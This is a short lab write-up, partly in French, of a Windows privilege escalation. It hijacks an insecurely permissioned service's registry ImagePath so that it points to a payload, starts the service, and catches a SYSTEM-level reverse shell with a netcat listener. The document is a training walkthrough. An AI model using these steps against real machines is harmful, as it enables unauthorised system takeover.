```console
C:\Users\user\AppData\Local\Temp>reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc"
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc"

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc\Security

C:\Users\user\AppData\Local\Temp>

C:\Users\user\AppData\Local\Temp>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

```

I used `reg add` to add my payload on it 

```console
C:\Users\user\AppData\Local\Temp>reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc"
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc"

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    C:\Users\user\AppData\Local\Temp\service.exe
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc\Security

C:\Users\user\AppData\Local\Temp>
```

Aussi il est la:

```console

C:\Users\user\AppData\Local\Temp>sc qc "regsvc"
sc qc "regsvc"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\user\AppData\Local\Temp\service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
- Pour demarrer mon payload, je peux demarrer ce service.

```console
C:\Users\user\AppData\Local\Temp>sc start "regsvc"
sc start "regsvc"
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```


```console
─$ sudo rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.6.8.193] from (UNKNOWN) [10.10.66.42] 49248
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>


```

Oubien je pourrai aussi faire `shutdown /r /t 0`